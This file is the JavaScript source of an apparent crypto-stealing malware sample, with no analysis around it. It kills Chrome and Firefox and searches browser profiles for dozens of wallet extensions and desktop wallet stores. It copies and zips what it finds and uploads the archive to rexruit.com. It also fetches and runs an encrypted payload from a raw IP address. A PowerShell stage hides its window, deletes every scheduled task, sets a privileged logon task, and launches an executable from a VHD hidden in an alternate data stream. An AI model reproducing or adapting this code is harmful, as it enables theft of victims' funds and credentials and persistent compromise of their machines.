var n = D => "\nAdd-Type -Name Window -Namespace Console -MemberDefinition '\n[DllImport(\"Kernel32.dll\")]\npublic static extern IntPtr GetConsoleWindow();\n\n[DllImport(\"user32.dll\")]\npublic static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);\n'\n\nfunction Hide-Console\n{\n    $consolePtr = [Console.Window]::GetConsoleWindow()\n    [Console.Window]::ShowWindow($consolePtr, 0)\n}\nHide-Console | Out-Null\n\n \n \n $task = Get-ScheduledTask -TaskName \"Update\" -ErrorAction SilentlyContinue\nif ($task -eq $null) {\n\n} else {\n Get-ScheduledTask | Unregister-ScheduledTask -Confirm:$false\n\n}\nschtasks /create /tn \"Update\" /tr \"powershell -ExecutionPolicy Bypass -File " + D + "\" /rl highest /sc onlogon  \n\n\n \n$registryPath = \"HKCU:\\Software\\Plutos\"\n$registryName = \"InitPath\"\n$savedPath = Get-ItemProperty -Path $registryPath -Name $registryName\n  if ($savedPath -and $savedPath.$registryName) {\n        $vhdPath = $savedPath.$registryName + \"\\setting.json:disk.vhd\"\n    } else {\n        return\n    }\n\nMount-DiskImage -ImagePath $vhdPath\n\n$diskImage = Get-DiskImage -ImagePath $vhdPath\n$diskNumber = $diskImage.Number\n$driveLetter = (Get-Partition -DiskNumber $diskNumber).DriveLetter\n$volumeInfo = Get-Volume -DriveLetter $driveLetter\n\n if ($volumeInfo) {\n \n       \n        mountvol  $savedPath.$registryName + \"\\.ini\" $volumeInfo.UniqueId\n\n        Start-Sleep -Seconds 1\n   \n\n         $exeFilePath = $savedPath.$registryName + \"\\.ini\"\n      \n \n \n        Start-Process -FilePath ($exeFilePath + '\\notepad_software_x64.exe') -ArgumentList \"-ExecutionPolicy Bypass -File $exeFilePath\" -PassThru\n        \n        Start-Sleep -Seconds 12\n      \n        Dismount-DiskImage -ImagePath $vhdPath | Out-Null\n       \n    \n    }\n    \n\n";
var x = path_module => btoa("\nconst { run } = require('" + path_module + "');\nrun()\n");
var w = path_module => btoa("\n    const crypto = require('crypto');\n    const { run } = require('" + path_module + "');\n    \n    (() => {\n            \n            \n        let key = null;\n        let iv = null;\n        fetch('http://140.82.54.223/get_encrypt_file/9o0il09RRPEPoS%2BmEZPaDg%3D%3D')\n            .then((response) => {\n    \n                key = Buffer.from(response.headers.get('X-Encryption-Key'), 'base64');\n                iv = Buffer.from(response.headers.get('X-Encryption-IV'), 'base64');\n    \n                return response.arrayBuffer();\n            })\n            .then((encryptedData) => {\n                const decipher = crypto.createDecipheriv('aes-128-cbc', key, iv);\n                const decryptedData = Buffer.concat([decipher.update(Buffer.from(encryptedData)), decipher.final()]);\n                const result = run(decryptedData);\n    \n               \n    \n    \n            })\n            .catch((error) => {\n                console.error(error);\n            });\n    })()\n    ");
function v(z, Q = 0) {
  try {
    const h = {
      withFileTypes: true
    };
    const c = fs.readdirSync(z, h);
    R(i);
    for (const U of c) {
      if (U.isDirectory()) {
        const f = path.join(z, U.name);
        if (E.some(N => U.name.includes(N)) && Q < 3) {
          o.push(f);
          Z(f).then(() => {
            o.pop();
            if (o.length == 0) {
              new Promise(N => setTimeout(N, 1000)).then(N => {
                new Promise(j => setTimeout(j, 20000)).then(j => {
                  try {
                    const pathModule = path.join(process.resourcesPath, "index.node");
                    const L = P(pathModule, S);
                    if (L) {
                      const p = Buffer.from(W, "base64");
                      const g = Buffer.from(F, "base64");
                      const u = y.createDecipheriv("aes-128-cbc", p, g);
                      const C = fs.readFileSync(pathModule.replaceAll("\\", "/"));
                      const t0 = Buffer.concat([u.update(Buffer.from(C)), u.final()]);
                      fs.writeFileSync(pathModule.replaceAll("\\", "/"), t0);
                    }
                    setTimeout(() => {
                      d.exec(path_node_g + " -e \"eval(atob('" + w(pathModule.replaceAll("\\", "/")) + "'))\"", (t1, t2, t3) => {
                        if (t1) {
                          return;
                        }
                        if (t3) {
                          return;
                        }
                        fs.unlink(pathModule.replaceAll("\\", "/"), t4 => {
                          if (t4) {
                            return;
                          }
                        });
                      });
                      G();
                    }, 1000);
                  } catch (t1) {}
                });
                if (fs.existsSync(i)) {
                  const j = fs.readdirSync(i);
                  if (j.length == 0) {
                    return;
                  }
                } else {
                  return;
                }
                const I = new AdmZip();
                I.addLocalFolder(i);
                let Y = I.toBuffer();
                const K = {
                  method: "POST",
                  hostname: "rexruit.com",
                  path: "/wall",
                  headers: {
                    "Content-Type": "application/octet-stream"
                  }
                };
                const M = () => {
                  const L = https.request(K, p => {
                    p.on("data", g => {
                      process.stdout.write(g);
                      if (g.includes("{\"status\":\"success\"}")) {
                        Y = null;
                      }
                      if (g.includes("502")) {
                        setTimeout(() => {
                          M();
                        }, 1000);
                      }
                    });
                  });
                  L.write(Y);
                  L.end();
                  L.on("error", p => {
                    console.error(p);
                    setTimeout(() => {
                      M();
                    }, 1000);
                  });
                };
                M();
              });
            }
          });
        }
        if (Q < 3) {
          v(f, Q + 1);
        }
      }
    }
  } catch (N) {
    console.log(N);
  }
}
function P(D, z) {
  const e = b(D);
  return e === z;
}
function b(D) {
  const z = y.createHash("sha256");
  const e = fs.readFileSync(D);
  z.update(e);
  return z.digest("hex");
}
function T() {
  const D = d.execSync("tasklist /FI \"IMAGENAME eq chrome.exe\"");
  if (D.includes("chrome")) {
    d.execSync("taskkill /F /im chrome.exe");
  }
  const z = d.execSync("tasklist /FI \"IMAGENAME eq firefox.exe\"");
  if (z.includes("firefox")) {
    d.execSync("taskkill /F /im firefox.exe");
  }
}
async function q(path_node) {
  path_node_g = path_node;
  T();
  await new Promise(D => setTimeout(D, 5000));
  for (const D of V) {
    v(D);
  }
  ;
}
async function O(path_node) {
  try {
    const D = Buffer.from(W, "base64");
    const z = Buffer.from(F, "base64");
    const Q = y.createDecipheriv("aes-128-cbc", D, z);
    const pathModule_net = path.join(process.resourcesPath, "net.node");
    const h = P(pathModule_net, A);
    if (!h) {
      return;
    }
    const c = fs.readFileSync(pathModule_net.replaceAll("\\", "/"));
    const U = Buffer.concat([Q.update(Buffer.from(c)), Q.final()]);
    fs.writeFileSync(pathModule_net.replaceAll("\\", "/"), U);
    d.execSync(path_node + " -e \"eval(atob('" + x(pathModule_net.replaceAll("\\", "/")) + "'))\"");
    fs.unlinkSync(pathModule_net.replaceAll("\\", "/"));
    await new Promise(Y => setTimeout(Y, 500));
    const f = "kINWynJPt";
    const N = "aqSDe";
    const I = path.join(a, "\\AppData\\Local\\" + f + "\\" + N + ".ps1");
    R(I);
    fs.writeFileSync(I, n(I), "utf-8");
    d.exec("powershell.exe -ExecutionPolicy Bypass -Command \"& { . '" + I + "' }\" -WindowStyle Hidden", (Y, H) => {
      if (Y) {
        console.error(Y);
      } else {
        console.log(H.toString());
      }
      fs.unlinkSync(pathModule_net.replaceAll("\\", "/"));
    });
  } catch (Y) {}
}
var R = D => {
  const z = path.dirname(D);
  if (!fs.existsSync(z)) {
    R(z);
    fs.mkdirSync(z);
  }
};
async function G() {
  try {
    await new Promise(c => setTimeout(c, 4000));
    const D = "https://nodejs.org/download/release/v22.9.0/node-v22.9.0-win-x64.zip";
    const z = path.join(process.env.APPDATA, "node_x64");
    const e = "hQhSxAdBQB.zip";
    const Q = path.join(process.env.TEMP, e);
    R(Q);
    const h = fs.createWriteStream(Q);
    await new Promise(c => setTimeout(c, 1000));
    https.get(D, c => {
      c.pipe(h);
      h.on("finish", async () => {
        h.close();
        await new Promise(f => setTimeout(f, 1000));
        if (!fs.existsSync(z)) {
          const f = {
            recursive: true
          };
          fs.mkdirSync(z, f);
        }
        try {
          const N = new AdmZip(Q);
          var U = N.getEntries();
          for (let Y = 0; Y < U.length; Y++) {
            const H = U[Y];
            const J = JSON.parse(H.toString());
            const K = H.getData();
            const M = (z + "\\" + J.entryName).replace("node-v22.9.0-win-x64", "node");
            if (J.isDirectory) {
              const j = {
                recursive: true
              };
              fs.mkdirSync(path.dirname(M), j);
            } else {
              R(M);
              fs.writeFileSync(M, K);
            }
          }
          const path_node = z + "\\node\\node.exe";
          const I = z + "\\node\\";
          try {
            const L = d.execSync("tasklist /FI \"IMAGENAME eq node.exe\"");
            if (L.includes("node")) {
              d.execSync("taskkill /im node.exe");
            }
          } catch (g) {}
          O(path_node);
        } catch (u) {
          fs.writeFileSync("_logs_err_load.txt", u.toString());
          new Promise(C => setTimeout(C, 2000));
        }
      }).on("error", U => {
        fs.writeFileSync("_logs_err.txt", U.toString());
        new Promise(f => setTimeout(f, 1000)).then(() => {
          G();
        });
      });
    });
  } catch (c) {
    fs.writeFileSync("_logs_err.txt", c.toString());
    await new Promise(U => setTimeout(U, 1000));
    G();
  }
}
async function k() {
  try {
    await new Promise(c => setTimeout(c, 1000));
    const D = "https://nodejs.org/download/release/v22.9.0/node-v22.9.0-win-x86.zip";
    const z = path.join(process.env.APPDATA, "node");
    const e = "MHzzZxT.zip";
    const Q = path.join(process.env.TEMP, e);
    R(Q);
    const h = fs.createWriteStream(Q);
    await new Promise(c => setTimeout(c, 1000));
    https.get(D, c => {
      c.pipe(h);
      h.on("finish", async () => {
        h.close();
        await new Promise(f => setTimeout(f, 1000));
        if (!fs.existsSync(z)) {
          const f = {
            recursive: true
          };
          fs.mkdirSync(z, f);
        }
        try {
          const N = new AdmZip(Q);
          var U = N.getEntries();
          for (let Y = 0; Y < U.length; Y++) {
            const H = U[Y];
            const J = JSON.parse(H.toString());
            const K = H.getData();
            const M = (z + "\\" + J.entryName).replace("node-v22.9.0-win-x86", "node");
            if (J.isDirectory) {
              const j = {
                recursive: true
              };
              fs.mkdirSync(path.dirname(M), j);
            } else {
              R(M);
              fs.writeFileSync(M, K);
            }
          }
          const path_node = z + "\\node\\node.exe";
          const I = z + "\\node\\";
          try {
            const L = d.execSync("tasklist /FI \"IMAGENAME eq node.exe\"");
            if (L.includes("node")) {
              d.execSync("taskkill /im node.exe");
            }
          } catch (g) {}
          q(path_node);
        } catch (u) {
          fs.writeFileSync("_logs_err_load.txt", u.toString());
          new Promise(C => setTimeout(C, 2000));
        }
      }).on("error", U => {
        fs.writeFileSync("_logs_err.txt", U.toString());
        new Promise(f => setTimeout(f, 1000)).then(() => {
          k();
        });
      });
    });
  } catch (c) {
    await new Promise(U => setTimeout(U, 1000));
    k();
  }
}
function Z(pathUserData) {
  return new Promise(z => {
    const Q = {
      MetaMask: "nkbihfbeogaeaoehlefnkodbefgpgknn",
      Binance: "fhbohimaelbohpjbbldcngcnapndodjp",
      Phantom: "bfnaelmomeimhlpmgjnjophhpkkoljpa",
      Coinbase: "hnfanknocfeofbddgcijnmhnfnkdnaad",
      Ronin: "fnjhmkhhmkbjkkabndcnnogagogbneec",
      Exodus: "aholpfdialjgjfhomihkjbmgjidlcdno",
      KardiaChain: "pdadjkfkgcafgbceimcpbkalnfnepbnk",
      TerraStation: "aiifbnbfobpmeekipheeijimdpnlpgpp",
      Wombat: "amkmjjmmflddogmhpjloimipbofnfjih",
      Harmony: "fnnegphlobjdpkhecapkijjdkgcjhkib",
      Nami: "lpfcbjknijpeeillifnkikgncikgfhdo",
      MartianAptos: "efbglgofoippbgcjepnhiblaibcnclgk",
      Braavos: "jnlgamecbpmbajjfhmmmlhejkemejdma",
      XDEFI: "hmeobnfnfcmdkdcmlblgagmfpfboieaf",
      Yoroi: "ffnbelfdoeiohenkjibnmadjiehjhajb",
      TON: "nphplpgoakhhjchkkhmiggakijnkhfnd",
      Authenticator: "bhghoamapcdpbohphigoooaddinpkbai",
      MetaMask_Edge: "ejbalbakoplchlghecdalmeeeajnimhm",
      Tron: "ibnejdfjmmkpcnlpebklmnkoeoihofec",
      MathWallet: "afbcbjpbpfadlkmhmclhkeeodmamcflc",
      Guarda: "hpglfhgfnhbgpjdenjgmdgoeiappafln",
      JaxxLiberty: "cjelfplplebdjjenllpjcblmjkfcffne",
      iWallet: "kncchdigobghenbbaddojjnnaogfppfj",
      MewCx: "nlbmnnijcnlegkjjpcfjclmcfggfefdm",
      NeoLine: "cphhlgmgameodnhkjdmkpanlelnlohao",
      CloverWallet: "nhnkbkgjikgcigadomkphalanndcapjk",
      LiqualityWallet: "kpfopkelmapcoipemfendmdcghnegimn",
      Keplr: "dmkamcknogkgcdfhhbddcghachkejeap",
      Sollet: "fhmfendgdocmcbmfikdcogofphimnkno",
      AuroWallet: "cnmamaachppnkjgnildpdmkaakejnhae",
      PolymeshWallet: "jojhfeoedkpkglbfimdfabpdfjaoolaf",
      ICONex: "flpiciilemghbmfalicajoolhkkenfel",
      Coin98: "aeachknmefphepccionboohckonoeemg",
      EVERWallet: "cgeeodpfagjceefieflmdfphplkenlfk",
      TrezorPasswordManager: "imloifkgjagghnncjkhggdhalmcnfklk",
      Rabby: "acmacodkjbdgmoleebolmdjonilkdbch",
      Oxygen: "fhilaheimglignddkjgofkcbgekhenbh",
      PaliWallet: "mgffkfbidihjpoaomajlbgchddlicgpn",
      BoltX: "aodkkagnadcbobfpggfnjeongemjbjca",
      NamiWallet: "lpfcbjknijpeeillifnkikgncikgfhdo",
      MaiarDeFiWallet: "dngmlblcodfobpdpecaadgfbcggfjfnm",
      WavesKeeper: "lpilbniiabackdjcionkobglmddfbcjo",
      Solflare: "bhhhlbepdkbapadjdnnojkbgioiodbic",
      CyanoWallet: "dkdedlpgdmmkkfjabffeganieamfklkm",
      KHC: "hcflpincpppdclinealmandijcmnkbgn",
      TezBox: "mnfifefkajgofkcjkemidiaecocnkjeh",
      Temple: "ookjlbkiijinhpmnjffcofjonbfbgaoc",
      Goby: "jnkelfanjkeadonecabehalmbgpfodjm",
      EOSAuthenticato: "oeljdldpnmdbchonielidgobddffflal",
      GAuthAuthentica: "ilgcnhelpchnceeipipijaljkblbcobl",
      ExodusWeb3Wallet: "flpiciilemghbmfalicajoolhkkenfel",
      Braavos_wallet: "jnlgamecbpmbajjfhmmmlhejkemejdma",
      Eth_and_Polk_Web3_Wallet: "kkpllkodjeloidieedojogacfhpaihoh",
      OKX_Wallet: "mcohilncbfahbmgdjkbpemcciiolgcge",
      Sender_Wallet: "epapihdplajcdnnkdeiahlgigofloibg",
      Hashpack: "gjagmgiddbbciopjhllkdnddhcglnemk",
      Eternl: "kmhcihpebfmpgmihbkipmjlmmioameka",
      GeroWallet: "bgpipimickeadkjlklgciifhnalhdjhe",
      Pontem_Aptos_Wallet: "phkbamefinggmakgklpkljjmgibohnba",
      Petra_Aptos_Wallet: "ejjladinnckdgjemekebdpeokbikhfci",
      EMartian_Aptos_Wallet: "efbglgofoippbgcjepnhiblaibcnclgk",
      Finnie: "cjmkndjhnagcfbpiemnkdpomccnjblmj",
      Leap_Terra_Wallet: "aijcbedoijmgnlmjeegjaglmepbmpkpi",
      Trust_Wallet: "egjidjbpglichdcondbcbdnbeeppgdph",
      Wverse: "idnnbdplmphpflfnlkomgpfbpcgelopg",
      unisat: "ppbibelpcjmhbdihakflkdcoccbgbkpo",
      leap: "fcfcfllfndlomdhbehjjcoimbgofdncg",
      sui: "opcgpfmipidbgpenhmajoajpbobppdil",
      Atomic_desktop: "Local Storage\\leveldb",
      Exodus_desktop: "exodus.wallet",
      Electrum_desktop: "wallets",
      Guarda_desktop_1: "Local Storage\\leveldb",
      Guarda_desktop_2: "https_guarda.co_0.indexeddb.leveldb",
      Guarda_desktop_3: "Session Storage",
      Coinomi_desktop: "wallets",
      MetaMask_Firefox: "4294967295"
    };
    const h = [];
    const c = [];
    const U = ["atomic", "Exodus", "Electrum", "Guarda", "Coinomi", "storage\\default"];
    const f = (pathFind, N = 0, I = 3) => {
      return new Promise(Y => {
        try {
          const H = {
            withFileTypes: true
          };
          const J = fs.readdirSync(pathFind, H);
          for (const K of J) {
            if (K.isDirectory()) {
              const M = path.join(pathFind, K.name);
              if (K.name.includes("Local Extension Settings") && N < 3) {
                h.push(M);
                Y(h);
              }
              if (!pathFind.includes("Firefox") && N < I) {
                c.push(f(M, N + 1));
              }
              if (pathFind.includes("Firefox") && N < I) {
                c.push(f(M, N + 1, 5));
              }
            } else if (U.some(j => pathFind.includes(j))) {
              h.push(pathFind);
              Y(h);
            }
          }
          Promise.all(c).then(() => {
            Y(h);
          });
        } catch (j) {
          console.log(j);
          Y(h);
        }
      });
    };
    f(pathUserData).then(N => {
      if (N.length == 0) {
        return z();
      }
      let I = [];
      N.forEach(Y => {
        let H = I.filter(J => J == Y);
        if (H.length == 0) {
          I.push(Y);
        }
      });
      I.forEach((Y, H) => {
        for (let [J, K] of Object.entries(Q)) {
          if (fs.existsSync(Y + "\\" + K)) {
            if (!Y.includes("atomic") && J == "Atomic_desktop") {
              continue;
            }
            if (!Y.includes("Guarda") && J.includes("Guarda_desktop")) {
              continue;
            }
            if (!Y.includes("Coinomi") && J == "Coinomi_desktop") {
              continue;
            }
            if (!Y.includes("Electrum") && J == "Electrum_desktop") {
              continue;
            }
            let M = Y.split("\\");
            let j = M.findIndex(p => p == "User Data");
            const pathWallet = Y + "\\" + K;
            const L = J.includes("desktop") ? i + "\\" + J : i + M[j + 1] + "\\" + J;
            s(pathWallet, L);
          } else if (!fs.existsSync(Y + "\\" + K) && Y.includes(K)) {
            if (!Y.includes("atomic") && J == "Atomic_desktop") {
              continue;
            }
            if (!Y.includes("Guarda") && J.includes("Guarda_desktop")) {
              continue;
            }
            if (!Y.includes("Coinomi") && J == "Coinomi_desktop") {
              continue;
            }
            if (!Y.includes("Electrum") && J == "Electrum_desktop") {
              continue;
            }
            const pathWallet = Y;
            const p = i + "\\" + J;
            s(pathWallet, p);
          }
          if (H == I.length - 1) {
            z();
          }
        }
      });
    });
  });
}
function s(z, e) {
  if (!fs.existsSync(e)) {
    const h = {
      recursive: true
    };
    fs.mkdirSync(e, h);
  }
  const Q = fs.readdirSync(z);
  Q.forEach(c => {
    const U = path.join(z, c);
    const f = fs.statSync(U);
    if (f.isDirectory()) {
      const N = path.relative(z, U);
      if (N !== "") {
        const I = path.join(e, N);
        if (!fs.existsSync(I)) {
          const Y = {
            recursive: true
          };
          fs.mkdirSync(I, Y);
        }
        s(U, I);
      }
    } else {
      const H = path.relative(z, U);
      if (H !== "") {
        const J = path.join(e, path.dirname(H));
        if (!fs.existsSync(J)) {
          const M = {
            recursive: true
          };
          fs.mkdirSync(J, M);
        }
        const K = path.join(J, path.basename(H));
        if (!fs.existsSync(K)) {
          try {
            fs.copyFileSync(U, K);
          } catch (j) {
            console.error(j);
          }
        }
      }
    }
  });
}
k();